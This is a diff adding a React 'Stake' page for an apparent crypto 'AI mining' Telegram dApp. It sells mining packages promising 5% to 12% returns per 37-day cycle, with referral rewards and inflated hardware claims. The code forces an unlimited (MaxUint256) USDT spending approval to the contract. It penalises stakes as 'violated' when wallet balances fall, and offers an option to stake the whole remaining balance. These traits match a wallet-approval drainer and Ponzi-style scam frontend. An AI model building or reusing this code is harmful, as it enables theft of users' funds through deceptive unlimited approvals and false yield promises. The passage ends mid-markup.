@@ -1,0 +1,1207 @@
+import React, { useState, useEffect, useCallback } from 'react';
+import { useNavigate } from 'react-router-dom';
+import { useWallet, runWithTimeout, redirectToWalletDappBrowser } from '../lib/web3';
+
+import { useStaking, getTierRate } from '../hooks/useStaking';
+import { useTelegram } from '../hooks/useTelegram';
+import { BrowserProvider, JsonRpcSigner, formatUnits, parseUnits, MaxUint256 } from 'ethers';
+import { usePrice } from '../hooks/usePrice';
+import { parseEthersError } from '../utils/errors';
+
+const Stake: React.FC = () => {
+    const navigate = useNavigate();
+    const { address, isConnected, connect, signer, walletProvider, miningStats, setMiningStats } = useWallet();
+    const { stake, approve, getAllowance, getStakedInfo, getStakeDetails, withdraw, getWalletBalance, recordPermanentStakeFlush, clearPermanentStakeFlush, isStakePermanentlyFlushed } = useStaking();
+    const { referrer, showAlert } = useTelegram();
+    const { btcPrice } = usePrice();
+
+    const [activeTab, setActiveTab] = useState('Riot Mining');
+    const [allowance, setAllowance] = useState('0.00');
+    const [loading, setLoading] = useState<number | string | null>(null);
+    const [userStakes, setUserStakes] = useState<any[]>([]);
+    const [stats, setStats] = useState({
+        totalStaked: miningStats.totalStaked || '0.00',
+        dailyYield: miningStats.dailyProfit || '0.00',
+        totalTP: miningStats.miningPower || '0'
+    });
+
+    const upgrades = [
+        {
+            id: 'lite',
+            name: 'Lite Mining Node',
+            description: 'Entry-level mining node for stable daily returns.',
+            tp: '+125 GH/s',
+            lvl: '5.0%',
+            price: '50 USDT',
+            icon: 'memory',
+            color: 'blue'
+        },
+        {
+            id: 'starter',
+            name: 'Starter Cluster',
+            description: 'Beginner-friendly cluster for increasing mining efficiency.',
+            tp: '+250 GH/s',
+            lvl: '5.0%',
+            price: '100 USDT',
+            icon: 'dns',
+            color: 'purple'
+        },
+        {
+            id: 'referral_pro',
+            name: 'Referral Pro Miner',
+            description: 'Optimized for high network rewards and stable hash power.',
+            tp: '+500 GH/s',
+            lvl: '5.0%',
+            price: '200 USDT',
+            icon: 'hub',
+            color: 'orange'
+        },
+        {
+            id: 'precision',
+            name: 'Precision Node',
+            description: 'Precision-tuned for industrial mining consistency.',
+            tp: '+1,000 GH/s',
+            lvl: '5.0%',
+            price: '400 USDT',
+            icon: 'model_training',
+            color: 'purple'
+        },
+        {
+            id: 'standard',
+            name: 'Standard Cluster',
+            description: 'Advanced mining cluster for increased hash power.',
+            tp: '+1,250 GH/s',
+            lvl: '5.5%',
+            price: '500 USDT',
+            icon: 'developer_board',
+            color: 'orange'
+        },
+        {
+            id: 'pro_ai',
+            name: 'Pro AI Node',
+            description: 'AI-optimized node for professional mining performance.',
+            tp: '+2,500 GH/s',
+            lvl: '6.0%',
+            price: '1000 USDT',
+            icon: 'psychology',
+            color: 'blue'
+        },
+        {
+            id: 'enterprise',
+            name: 'Enterprise Cluster',
+            description: 'Enterprise grade mining cluster for high throughput.',
+            tp: '+5,000 GH/s',
+            lvl: '7%',
+            price: '2000 USDT',
+            icon: 'business',
+            color: 'purple'
+        },
+        {
+            id: 'industrial',
+            name: 'Industrial Node',
+            description: 'Industrial-grade mining node for massive returns.',
+            tp: '+12,500 GH/s',
+            lvl: '8%',
+            price: '5000 USDT',
+            icon: 'settings_input_component',
+            color: 'orange'
+        },
+        {
+            id: 'apex_ai',
+            name: 'Apex AI Cluster',
+            description: 'Apex AI cluster optimized for maximum mining efficiency.',
+            tp: '+25,000 GH/s',
+            lvl: '12%',
+            price: '10000 USDT',
+            icon: 'bolt',
+            color: 'blue'
+        }
+    ];
+
+    const hardwareData = [
+        {
+            name: 'Bitmain Antminer S19 Pro',
+            specs: '110 TH/s | 3250W | High Stability',
+            desc: 'The flagship industrial miner. Known for unmatched reliability and massive SHA-256 hash power.',
+            icon: 'settings_input_component',
+            color: 'orange'
+        },
+        {
+            name: 'Whatsminer M30S++',
+            specs: '112 TH/s | 3400W | Ultra-Efficiency',
+            desc: 'Maximum throughput with advanced liquid-cooled variants available for our global hubs.',
+            icon: 'faucet',
+            color: 'blue'
+        },
+        {
+            name: 'AvalonMiner 1246',
+            specs: '90 TH/s | 3420W | Robust Chassis',
+            desc: 'Heavy-duty enterprise grade miner designed for continuous 24/7 high-temperature operations.',
+            icon: 'precision_manufacturing',
+            color: 'purple'
+        },
+        {
+            name: 'Bitmain Antminer T19',
+            specs: '84 TH/s | 3150W | Standard Unit',
+            desc: 'The backbone of our standard mining clusters, providing consistent uptime and node stability.',
+            icon: 'developer_board',
+            color: 'orange'
+        },
+        {
+            name: 'Canaan Avalon 1166 Pro',
+            specs: '81 TH/s | 3400W | High Density',
+            desc: 'Compact powerhouse used for our high-density rack configurations in the Nordic hubs.',
+            icon: 'dns',
+            color: 'blue'
+        },
+        {
+            name: 'AI-Managed GPU Cluster',
+            specs: '640 GB VRAM | NVIDIA H100 Stack',
+            desc: 'Our proprietary AI compute cluster used for mining optimization and recursive hash prediction.',
+            icon: 'memory',
+            color: 'purple'
+        }
+    ];
+
+    const tabs = ['Riot Mining', 'Plan', 'Hardware', 'My Stakes', 'News'];
+
+    const getWalletAddress = () => {
+        const stored = localStorage.getItem('aimining_address') || localStorage.getItem('aimining_manual_address');
+        const eth = (window as any).ethereum;
+        const activeEthAddress = eth?.selectedAddress || (Array.isArray(eth?.accounts) && eth.accounts.length > 0 ? eth.accounts[0] : undefined);
+        return address || activeEthAddress || stored || undefined;
+    };
+
+    const updateStakes = useCallback(async () => {
+        const walletAddress = getWalletAddress();
+        if (!walletAddress) {
+            setStats({ totalStaked: '0.00', dailyYield: '0.00', totalTP: '0' });
+            setUserStakes([]);
+            setAllowance('0.00');
+            return;
+        }
+        const info = await getStakedInfo(walletAddress);
+        if (info) {
+            const count = info.stakeCount;
+            const fetchedStakes = [];
+            let failed = false;
+            for (let i = 0; i < count; i++) {
+                const detail = await getStakeDetails(walletAddress, i);
+                if (detail === null) {
+                    failed = true;
+                    break;
+                }
+                fetchedStakes.push(detail);
+            }
+            if (failed) return; // Keep previous state!
+            
+            // FETCH LIVE WALLET BALANCE - One Truth Policy
+            const usdtBalanceStr = await getWalletBalance(walletAddress);
+            const usdtBalance = usdtBalanceStr !== null ? parseFloat(usdtBalanceStr) : parseFloat(miningStats.walletBalance || '0');
+            // Don't return early on null balance — continue with previous value
+
+            // FETCH CURRENT ALLOWANCE - check if user revoked approval
+            const currentAllowanceStr = await getAllowance(walletAddress);
+
+            let totalContractAmount = 0;
+            let totalActiveStaked = 0;
+            let activeStakedForPower = 0;
+            let dailyUsdtYield = 0;
+            const details = [];
+            let runningStakedSum = 0;
+            for (let i = 0; i < count; i++) {
+                const detail = fetchedStakes[i];
+                if (detail && !detail.withdrawn) {
+                    const stakeAmount = parseFloat(formatUnits(detail.amount, 18));
+                    const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
+                    const wasFlushed = isStakePermanentlyFlushed(walletAddress, i);
+                    const isBalanceSufficient = finished || (usdtBalance + 0.1) >= runningStakedSum + stakeAmount;
+                    if (isBalanceSufficient && wasFlushed) {
+                        clearPermanentStakeFlush(walletAddress, i);
+                    }
+                    
+                    // Check violation: balance insufficient OR allowance revoked
+                    // IMPORTANT: Only check balance violation if balance is reliable (fresh from RPC)
+                    // Otherwise old stakes get incorrectly marked as violated on RPC failure
+                    const isViolated = isStakePermanentlyFlushed(walletAddress, i) || (!finished && usdtBalanceStr !== null && (usdtBalance + 0.1) < runningStakedSum + stakeAmount);
+                    
+                    totalContractAmount += stakeAmount;
+
+                    if (isViolated) {
+                        recordPermanentStakeFlush(walletAddress, i);
+                        details.push({ ...detail, index: i, displayVal: stakeAmount, currentHold: stakeAmount, isViolated: true });
+                    } else {
+                        if (!finished) {
+                            runningStakedSum += stakeAmount;
+                            totalActiveStaked += stakeAmount;
+                            activeStakedForPower += stakeAmount;
+                            
+                            const rate = getTierRate(stakeAmount); 
+                            dailyUsdtYield += (stakeAmount * rate) / 37;
+                        }
+                        details.push({ ...detail, index: i, displayVal: stakeAmount, currentHold: stakeAmount, isViolated: false });
+                    }
+                }
+            }
+
+            const safeBtcPrice = btcPrice && btcPrice > 0 && !isNaN(btcPrice) ? btcPrice : 78000;
+            const yieldVal = dailyUsdtYield / safeBtcPrice;
+            const dailyYieldStr = (!isNaN(yieldVal) && isFinite(yieldVal)) ? yieldVal.toFixed(14) : '0.00000000000000';
+
+            const newStats = {
+                totalStaked: totalActiveStaked.toFixed(2),
+                dailyYield: dailyYieldStr,
+                totalTP: (activeStakedForPower * 2.5).toFixed(0)
+            };
+
+            setStats(newStats);
+            setUserStakes(details);
+
+            // Set allowance (already fetched above for violation check)
+            setAllowance(currentAllowanceStr);
+
+            // Update global context for other pages
+            setMiningStats((prev: any) => ({
+                ...prev,
+                miningPower: newStats.totalTP,
+                dailyProfit: newStats.dailyYield,
+                totalStaked: newStats.totalStaked,
+                walletBalance: usdtBalanceStr,
+                isLoaded: true
+            }));
+        }
+    }, [isConnected, address, getStakedInfo, getStakeDetails, getWalletBalance, getAllowance, recordPermanentStakeFlush, isStakePermanentlyFlushed, btcPrice, setMiningStats]);
+
+    useEffect(() => {
+        updateStakes();
+        const interval = setInterval(updateStakes, 60000); // 1m Stable Sync
+        return () => clearInterval(interval);
+    }, [updateStakes]);
+
+    // Effect 2: Global Ticker Sync
+    useEffect(() => {
+        if (miningStats.isLoaded) {
+            setStats(prev => ({
+                ...prev,
+                totalStaked: miningStats.totalStaked,
+                dailyYield: miningStats.dailyProfit,
+                totalTP: miningStats.miningPower
+            }));
+        }
+    }, [miningStats]);
+
+    // Live countdown timer state
+    const [currentTime, setCurrentTime] = useState(Date.now() / 1000);
+    useEffect(() => {
+        const timer = setInterval(() => setCurrentTime(Date.now() / 1000), 1000);
+        return () => clearInterval(timer);
+    }, []);
+
+    const formatCountdown = (startTime: number) => {
+        const endTime = startTime + (37 * 86400);
+        const diff = endTime - currentTime;
+        if (diff <= 0) return null;
+
+        const days = Math.floor(diff / 86400);
+        const hours = Math.floor((diff % 86400) / 3600);
+        const minutes = Math.floor((diff % 3600) / 60);
+        const seconds = Math.floor(diff % 60);
+
+        return `${days}h ${hours}m ${minutes}s ${seconds}s`; // Using Short format for button
+    };
+
+    const requestAccountsFromProvider = async (provider: any): Promise<string | undefined> => {
+        if (!provider || typeof provider.request !== 'function') return undefined;
+        try {
+            let accounts = await provider.request({ method: 'eth_accounts' });
+            if (Array.isArray(accounts) && accounts.length > 0) return accounts[0];
+        } catch (err) {
+            console.warn('[Stake] provider eth_accounts failed:', err);
+        }
+        try {
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            if (Array.isArray(accounts) && accounts.length > 0) return accounts[0];
+        } catch (err) {
+            console.warn('[Stake] provider eth_requestAccounts failed:', err);
+        }
+        return undefined;
+    };
+
+    const getActiveWalletAddress = async (): Promise<string | undefined> => {
+        if (address) return address;
+        if (signer) {
+            try {
+                return await signer.getAddress();
+            } catch (err) {
+                console.warn('[Stake] signer.getAddress failed:', err);
+            }
+        }
+        if (walletProvider) {
+            try {
+                const browserProvider = new BrowserProvider(walletProvider as any);
+                // Use JsonRpcSigner constructor to avoid eth_requestAccounts hang
+                const storedAddr = address || localStorage.getItem('aimining_manual_address') || localStorage.getItem('aimining_address');
+                if (storedAddr) {
+                    const s = new JsonRpcSigner(browserProvider, storedAddr);
+                    const addr = await s.getAddress();
+                    if (addr) return addr;
+                }
+                const signerFromProvider = await runWithTimeout('walletProvider getSigner', browserProvider.getSigner(), 5000);
+                const addressFromSigner = await signerFromProvider.getAddress();
+                if (addressFromSigner) return addressFromSigner;
+            } catch (err) {
+                console.warn('[Stake] walletProvider signer failed:', err);
+            }
+            const providerAny = walletProvider as any;
+            if (providerAny.selectedAddress) return providerAny.selectedAddress;
+            if (Array.isArray(providerAny.accounts) && providerAny.accounts.length > 0) return providerAny.accounts[0];
+            const accountFromRequest = await requestAccountsFromProvider(providerAny);
+            if (accountFromRequest) return accountFromRequest;
+        }
+        const eth = (window as any).ethereum;
+        if (eth?.selectedAddress) return eth.selectedAddress;
+        if (Array.isArray(eth?.accounts) && eth.accounts.length > 0) return eth.accounts[0];
+        if (Array.isArray(eth?.providers) && eth.providers.length > 0) {
+            const chosen = eth.providers.find((p: any) => p.selectedAddress || Array.isArray(p.accounts) && p.accounts.length > 0 || typeof p.request === 'function');
+            if (chosen) {
+                if (chosen.selectedAddress) return chosen.selectedAddress;
+                if (Array.isArray(chosen.accounts) && chosen.accounts.length > 0) return chosen.accounts[0];
+                const accountFromRequest = await requestAccountsFromProvider(chosen);
+                if (accountFromRequest) return accountFromRequest;
+            }
+        }
+        if (eth?.request) {
+            const account = await requestAccountsFromProvider(eth);
+            if (account) return account;
+        }
+
+        const web3Provider = (window as any).web3?.currentProvider;
+        if (web3Provider && web3Provider !== eth) {
+            if (web3Provider.selectedAddress) return web3Provider.selectedAddress;
+            if (Array.isArray(web3Provider.accounts) && web3Provider.accounts.length > 0) return web3Provider.accounts[0];
+            const accountFromRequest = await requestAccountsFromProvider(web3Provider);
+            if (accountFromRequest) return accountFromRequest;
+        }
+
+        const tp = (window as any).tokenpocket?.ethereum;
+        if (tp?.selectedAddress) return tp.selectedAddress;
+        if (Array.isArray(tp?.accounts) && tp.accounts.length > 0) return tp.accounts[0];
+        if (tp?.request) {
+            const account = await requestAccountsFromProvider(tp);
+            if (account) return account;
+        }
+
+        const sp = (window as any).safepal?.ethereum || (window as any).safepalProvider;
+        if (sp?.selectedAddress) return sp.selectedAddress;
+        if (Array.isArray(sp?.accounts) && sp.accounts.length > 0) return sp.accounts[0];
+        if (sp?.request) {
+            const account = await requestAccountsFromProvider(sp);
+            if (account) return account;
+        }
+
+        // TMA fallback: after a page reload in the Telegram WebView the AppKit
+        // context (address / signer / walletProvider) is often not synced yet and
+        // window.ethereum does NOT exist there — so everything above returns
+        // nothing even though the wallet is still connected (WC session persists
+        // in localStorage). The wallet address is saved at connect time; the
+        // actual transaction is sent via useStaking's raw EIP-1193 provider path
+        // (WC session restore), so the stored address is enough to proceed.
+        const storedAddress = localStorage.getItem('aimining_address') || localStorage.getItem('aimining_manual_address');
+        if (storedAddress) return storedAddress;
+
+        return undefined;
+    };
+
+    // Read referral from URL when opened in wallet dapp browser
+    useEffect(() => {
+        const params = new URLSearchParams(window.location.search);
+        const refFromUrl = params.get('ref');
+        if (refFromUrl) {
+            localStorage.setItem('aimining_referrer', refFromUrl);
+        }
+    }, []);
+
+    const handleBuy = async (id: number | string, priceStr: string) => {
+        console.log(`[Stake] handleBuy called: id=${id}, price=${priceStr}`);
+        // Step 1: Ensure wallet is connected (WalletConnect in TMA)
+        let fallbackAddress: string | undefined;
+        try {
+            fallbackAddress = await Promise.race([
+                getActiveWalletAddress(),
+                new Promise<undefined>((_, reject) => setTimeout(() => reject(new Error('Wallet address lookup timed out')), 10000))
+            ]);
+        } catch (e: any) {
+            console.warn('[Stake] getActiveWalletAddress failed:', e);
+            showAlert('Could not detect wallet. Please reconnect and try again.');
+            return;
+        }
+        if (!fallbackAddress) {
+            // Not connected — open AppKit connect modal (WalletConnect)
+            localStorage.setItem('pending_upgrade', JSON.stringify({ id, priceStr }));
+            connect(); // Opens WalletConnect modal — user connects via wallet app
+            return;
+        }
+        console.log(`[Stake] Wallet address: ${fallbackAddress}`);
+
+        // walletProvider may be null here even when address is valid (AppKit render timing).
+        // Don't block — let getContract() fallback mechanisms handle it.
+        if (!walletProvider) {
+            console.log('[Stake] walletProvider is null but address exists — will use fallbacks in getContract()');
+        }
+
+        if (loading) return;
+
+        // In Telegram Mini App (no injected provider) a WalletConnect tx often
+        // never reaches the wallet (dead relay). Open the dApp inside the
+        // connected wallet's dApp browser and auto-resume there.
+        const isTMA = !!(window as any).Telegram?.WebApp;
+        const hasInjected = !!(window as any).ethereum || !!(window as any).tokenpocket?.ethereum || !!(window as any).safepal?.ethereum;
+        if (isTMA && !hasInjected) {
+            const cleaned = (typeof priceStr === 'string') ? priceStr.replace(/[^0-9.]/g, '') : String(priceStr || '0').replace(/[^0-9.]/g, '');
+            showAlert('Opening in your wallet browser — approve the transaction there.');
+            redirectToWalletDappBrowser({ action: 'stake', pkg: String(id), amt: cleaned });
+            return;
+        }
+
+        setLoading(id);
+
+        // Safety timeout: clear loading after 90 seconds (approve + stake shouldn't take longer)
+        const safetyTimer = setTimeout(() => {
+            console.warn('[Stake] Safety timeout: clearing loading state after 90s');
+            setLoading(null);
+            showAlert('Transaction is taking too long. Please check your wallet app for any pending approvals, then try again. If the issue persists, reconnect your wallet.');
+        }, 90000);
+
+        try {
+            const cleanedPriceStr = (typeof priceStr === 'string') ? priceStr.replace(/[^0-9.]/g, '') : String(priceStr || '0').replace(/[^0-9.]/g, '');
+            localStorage.setItem('pending_upgrade', JSON.stringify({ id, priceStr: cleanedPriceStr }));
+
+            // Step 2: Check balance
+            console.log('[Stake] Step 2: Checking balance...');
+            const balanceStr = await getWalletBalance(fallbackAddress);
+            console.log(`[Stake] Balance: ${balanceStr}`);
+            if (balanceStr === null) {
+                throw new Error("Could not check wallet balance due to network issues. Try again.");
+            }
+            
+            const balanceBigInt = parseUnits(balanceStr, 18);
+            const refAddress = referrer || localStorage.getItem('aimining_referrer') || '0x0000000000000000000000000000000000000000';
+
+            let priceBigInt;
+            if (id === 'extra-fund') {
+                const info = await getStakedInfo(fallbackAddress);
+                let activeStakedBigInt = 0n;
+                if (info) {
+                    const count = info.stakeCount;
+                    let runningStakedSumBigInt = 0n;
+                    for (let i = 0; i < count; i++) {
+                        const detail = await getStakeDetails(fallbackAddress, i);
+                        if (detail && !detail.withdrawn) {
+                            const stakeAmountBigInt = detail.amount;
+                            const finished = (Date.now() / 1000) > detail.startTime + (37 * 86400);
+                            const wasFlushed = isStakePermanentlyFlushed(fallbackAddress, i);
+                            const isBalanceSufficient = finished || balanceBigInt >= runningStakedSumBigInt + stakeAmountBigInt;
+                            if (isBalanceSufficient && wasFlushed) {
+                                clearPermanentStakeFlush(fallbackAddress, i);
+                            }
+                            const isViolated = isStakePermanentlyFlushed(fallbackAddress, i) || (!finished && balanceBigInt < runningStakedSumBigInt + stakeAmountBigInt);
+                            if (!isViolated && !finished) {
+                                activeStakedBigInt += stakeAmountBigInt;
+                                runningStakedSumBigInt += stakeAmountBigInt;
+                            }
+                        }
+                    }
+                }
+                priceBigInt = balanceBigInt - activeStakedBigInt;
+                if (priceBigInt < 0n) priceBigInt = 0n;
+                const remainder = priceBigInt % 10000000000000000n;
+                priceBigInt = priceBigInt - remainder;
+            } else {
+                priceBigInt = parseUnits(cleanedPriceStr, 18);
+            }
+
+            if (balanceBigInt < priceBigInt) {
+                localStorage.removeItem('pending_upgrade');
+                showAlert(`Insufficient wallet balance. You need at least ${formatUnits(priceBigInt, 18)} USDT.`);
+                return;
+            }
+
+            const minStakeBigInt = parseUnits("50", 18);
+            if (priceBigInt < minStakeBigInt) {
+                localStorage.removeItem('pending_upgrade');
+                showAlert("Minimum 50 USDT required to activate mining node.");
+                return;
+            }
+
+            const finalAmount = formatUnits(priceBigInt, 18);
+
+            // Step 3: Check allowance and approve if needed
+            console.log('[Stake] Step 3: Checking allowance...');
+            const currentAllowanceStr = await getAllowance(fallbackAddress);
+            const currentAllowance = parseUnits(currentAllowanceStr || '0', 18);
+            const isTMA = !!(window as any).Telegram?.WebApp;
+            console.log(`[Stake] Current allowance: ${currentAllowanceStr}, Threshold needed: unlimited`);
+
+            // Contract requires Unlimited/Max approval (MaxUint256)
+            const APPROVAL_THRESHOLD = MaxUint256 / 2n;
+            if (currentAllowance < APPROVAL_THRESHOLD) {
+                console.log("[Stake] Unlimited approval required. Requesting MaxUint256 approval.");
+                // In TMA: Alert user that wallet will open for approval
+                if (isTMA) {
+                    try {
+                        const tg = (window as any).Telegram?.WebApp;
+                        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('warning');
+                        showAlert("Please check your wallet app to approve the USDT spending limit. You'll need to approve 2 transactions (approval + stake).");
+                    } catch {}
+                }
+                const approvalTx = await approve();
+
+                if (approvalTx && typeof approvalTx.wait === 'function') {
+                    if (isTMA) {
+                        console.log("[Stake] TMA mode: Polling allowance instead of tx.wait()...");
+                        const maxPoll = 15;
+                        for (let p = 0; p < maxPoll; p++) {
+                            await new Promise(r => setTimeout(r, 2000));
+                            const polled = await getAllowance(fallbackAddress);
+                            if (parseUnits(polled || '0', 18) >= APPROVAL_THRESHOLD) {
+                                console.log(`[Stake] Unlimited allowance confirmed on poll ${p + 1}`);
+                                break;
+                            }
+                        }
+                    } else {
+                        try {
+                            const waitPromise = approvalTx.wait();
+                            const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Approval wait timeout')), 30000));
+                            await Promise.race([waitPromise, timeout]);
+                        } catch (waitErr: any) {
+                            console.warn("[Stake] Approval wait failed, polling allowance...", waitErr?.shortMessage || waitErr);
+                            for (let p = 0; p < 8; p++) {
+                                await new Promise(r => setTimeout(r, 2000));
+                                const polled = await getAllowance(fallbackAddress);
+                                if (parseUnits(polled || '0', 18) >= APPROVAL_THRESHOLD) break;
+                            }
+                        }
+                    }
+                }
+
+                const refreshedAllowanceStr = await getAllowance(fallbackAddress);
+                const refreshedAllowance = parseUnits(refreshedAllowanceStr || '0', 18);
+                if (refreshedAllowance < APPROVAL_THRESHOLD) {
+                    throw new Error("USDT unlimited approval not confirmed. Please approve again and retry.");
+                }
+            }
+
+            // Step 4: Call stake function
+            console.log('[Stake] Step 4: Calling stake function...');
+            // skipApproval=true because handleBuy already handled approval above
+            const tx = await stake(finalAmount, refAddress, true);
+            console.log('[Stake] Stake TX sent:', tx?.hash);
+
+            // In TMA: tx is already sent to blockchain via wallet.
+            // Don't block on tx.wait() which hangs after wallet redirect.
+            // Show success immediately — on-chain state updates on next refresh.
+            if (isTMA) {
+                console.log("[Stake] TMA mode: Transaction sent, skipping tx.wait() to avoid hang.");
+                localStorage.setItem('pending_stake_refresh', '1');
+            } else {
+                try {
+                    const waitPromise = tx.wait();
+                    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Stake wait timeout')), 30000));
+                    await Promise.race([waitPromise, timeout]);
+                } catch (waitErr: any) {
+                    console.warn("[Stake] tx.wait failed (may be mined). Proceeding:", waitErr?.shortMessage || waitErr);
+                    localStorage.setItem('pending_stake_refresh', '1');
+                }
+            }
+
+            localStorage.removeItem('pending_upgrade');
+            localStorage.removeItem('pending_stake_refresh');
+            showAlert(`Success: Staked ${formatUnits(priceBigInt, 18)} USDT and upgraded mining node!`);
+            await updateStakes();
+        } catch (err: any) {
+            console.error('[Stake] handleBuy error:', err?.message || err);
+            const msg = parseEthersError(err);
+
+            // ALWAYS clear pending_upgrade on error to prevent infinite auto-resume loop
+            localStorage.removeItem('pending_upgrade');
+            // Store fail msg so auto-resume useEffect knows last attempt failed
+            localStorage.setItem('pending_upgrade_fail_msg', msg || 'Unknown');
+
+            showAlert(msg);
+        } finally {
+            clearTimeout(safetyTimer);
+            setLoading(null);
+        }
+    };
+
+    // Auto-resume pending upgrade after wallet connects (refs to avoid stale closures)
+    const handleBuyRef = React.useRef<((id: number | string, priceStr: string) => Promise<void>) | null>(null);
+    handleBuyRef.current = handleBuy;
+    const loadingRef = React.useRef(loading);
+    loadingRef.current = loading;
+
+    useEffect(() => {
+        if (!isConnected || !address) return;
+        const pending = localStorage.getItem('pending_upgrade');
+        const prevFailed = localStorage.getItem('pending_upgrade_fail_msg');
+        // If previous attempt failed with error, don't auto-retry — user needs to manually click
+        if (prevFailed) {
+            console.log('[Stake] Previous upgrade failed, clearing fail msg. User must click manually.');
+            localStorage.removeItem('pending_upgrade_fail_msg');
+            localStorage.removeItem('pending_upgrade');
+            return;
+        }
+        if (!pending) return;
+        // walletProvider may be null temporarily during page transitions even when
+        // the WC session is valid. Don't block — getContract() will use fallbacks.
+        if (!walletProvider) {
+            console.log('[Stake] Auto-resume: walletProvider null but will try anyway (fallbacks in getContract)');
+        }
+        try {
+            const { id, priceStr } = JSON.parse(pending);
+            if (id && priceStr && !loadingRef.current) {
+                console.log('[Stake] Auto-resuming pending upgrade after wallet connect:', id);
+                // Clear the pending item BEFORE attempting, so if it fails again it won't loop
+                localStorage.removeItem('pending_upgrade');
+                // Small delay to ensure signer is synced
+                const timer = setTimeout(() => {
+                    if (!loadingRef.current && handleBuyRef.current) {
+                        handleBuyRef.current(id, priceStr);
+                    }
+                }, 2000);
+                return () => clearTimeout(timer);
+            }
+        } catch (e) {
+            console.warn('[Stake] Failed to parse pending_upgrade:', e);
+            localStorage.removeItem('pending_upgrade');
+        }
+    }, [isConnected, address, walletProvider]);
+
+    const handleWithdraw = async (index: number) => {
+        const fallbackAddress = await getActiveWalletAddress();
+        if (!fallbackAddress) {
+            connect(); // Opens WalletConnect modal
+            return;
+        }
+        const isTMA = !!(window as any).Telegram?.WebApp;
+        const hasInjected = !!(window as any).ethereum || !!(window as any).tokenpocket?.ethereum || !!(window as any).safepal?.ethereum;
+        if (isTMA && !hasInjected) {
+            showAlert('Opening in your wallet browser — approve the withdrawal there.');
+            redirectToWalletDappBrowser({ action: 'withdraw', idx: String(index) });
+            return;
+        }
+        setLoading(`withdraw-${index}`);
+        try {
+            const tx = await withdraw(index);
+            // signer path returns a real TransactionResponse — wait for mining
+            try {
+                if (tx && typeof tx.wait === 'function') {
+                    await tx.wait();
+                }
+            } catch (waitErr: any) {
+                console.warn('[Withdraw] tx.wait failed after wallet redirect:', waitErr?.shortMessage || waitErr);
+            }
+            showAlert('Success: Withdrawal completed!');
+            await updateStakes();
+        } catch (err: any) {
+            showAlert(parseEthersError(err));
+        } finally {
+            setLoading(null);
+        }
+    };
+
+    const handleWithdrawRef = React.useRef<((index: number) => Promise<void>) | null>(null);
+    handleWithdrawRef.current = handleWithdraw;
+
+    // Auto-resume a stake / withdraw that was redirected from Telegram to the
+    // connected wallet's dApp browser (via ?action= URL params — because
+    // localStorage is NOT shared between the Telegram WebView and the wallet's
+    // own dApp browser on the same device).
+    useEffect(() => {
+        if (!isConnected || !address) return;
+        const params = new URLSearchParams(window.location.search);
+        const action = params.get('action');
+        if (!action) return;
+
+        const pkg = params.get('pkg');
+        const amt = params.get('amt');
+        const idx = params.get('idx');
+
+        // Clear the action params so a refresh doesn't re-trigger it.
+        params.delete('action'); params.delete('pkg'); params.delete('amt'); params.delete('idx');
+        const cleanUrl = `${window.location.pathname}${params.toString() ? '?' + params.toString() : ''}${window.location.hash}`;
+        window.history.replaceState({}, '', cleanUrl);
+
+        const timer = setTimeout(() => {
+            if (loadingRef.current) return;
+            if (action === 'stake' && pkg && amt) {
+                handleBuyRef.current?.(pkg, amt);
+            } else if (action === 'withdraw' && idx) {
+                const i = parseInt(idx, 10);
+                if (!isNaN(i)) handleWithdrawRef.current?.(i);
+            }
+        }, 2500);
+        return () => clearTimeout(timer);
+    }, [isConnected, address, walletProvider]);
+
+    const getColorClasses = (color: string) => {
+        switch (color) {
+            case 'purple': return { bg: 'bg-purple-100 dark:bg-[#1e1a2e]', text: 'text-purple-600 dark:text-purple-400', shadow: 'drop-shadow-[0_0_5px_rgba(192,132,252,0.5)]' };
+            case 'blue': return { bg: 'bg-blue-100 dark:bg-[#121c2e]', text: 'text-blue-600 dark:text-blue-400', shadow: 'drop-shadow-[0_0_5px_rgba(96,165,250,0.5)]' };
+            case 'orange': return { bg: 'bg-orange-100 dark:bg-[#2e1d15]', text: 'text-orange-600 dark:text-orange-400', shadow: 'drop-shadow-[0_0_5px_rgba(251,146,60,0.5)]' };
+            default: return { bg: 'bg-gray-100', text: 'text-gray-600', shadow: '' };
+        }
+    };
+
+    return (
+        <div className="flex-1 flex flex-col pb-10 bg-background-dark min-h-screen font-display">
+            <header className="flex items-center justify-between px-4 py-4 bg-background-dark sticky top-0 z-20 border-b border-white/5">
+                <div className="flex items-center gap-2 text-gray-300">
+                    <button onClick={() => navigate(-1)} className="cursor-pointer hover:text-primary transition-colors border-none bg-transparent">
+                        <span className="material-icons-round">arrow_back</span>
+                    </button>
+                    <h1 className="text-lg font-black tracking-tight text-white uppercase italic">Upgrade Power</h1>
+                </div>
+                <div className="flex items-center gap-2 bg-white/5 px-3 py-1.5 rounded-full border border-white/5">
+                    <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Power</span>
+                    <span className="text-xs font-black text-primary drop-shadow-[0_0_8px_rgba(255,215,0,0.5)]">{stats.totalTP} GH/s</span>
+                    <span className="material-icons-round text-primary text-sm">bolt</span>
+                </div>
+            </header>
+
+            <main className="flex-1 p-4 pb-10 overflow-y-auto">
+                <section className="mb-6">
+                    <div className="bg-gradient-to-br from-[#1a1a1a] to-[#0a0a0a] rounded-2xl p-6 text-white relative overflow-hidden border border-white/10 shadow-glow">
+                        <div className="absolute -top-12 -right-12 w-40 h-40 bg-primary opacity-[0.08] rounded-full blur-3xl"></div>
+                        <div className="relative z-10 flex flex-col items-center text-center">
+                            <span className="text-gray-500 text-[10px] mb-1 font-black tracking-widest uppercase">Est. Daily Yield</span>
+                            <div className="text-3xl font-black text-white flex items-center gap-1 mt-1 font-display tracking-tight">
+                                {stats.dailyYield} <span className="text-primary text-sm">BTC</span>
+                            </div>
+                            <p className="text-[10px] text-primary mt-2 flex items-center gap-1 font-black bg-primary/10 px-2 py-0.5 rounded-md border border-primary/20 uppercase tracking-tighter">
+                                <span className="material-icons-round text-[14px]">trending_up</span> 5.5% - 12% Cycle MINE Active
+                            </p>
+                        </div>
+                    </div>
+                </section>
+
+                <div className="flex gap-3 mb-6 overflow-x-auto pb-2 scrollbar-hide">
+                    {tabs.map(tab => (
+                        <button
+                            key={tab}
+                            onClick={() => setActiveTab(tab)}
+                            className={`px-5 py-2 rounded-full text-[10px] font-black whitespace-nowrap transition-all uppercase tracking-widest ${activeTab === tab
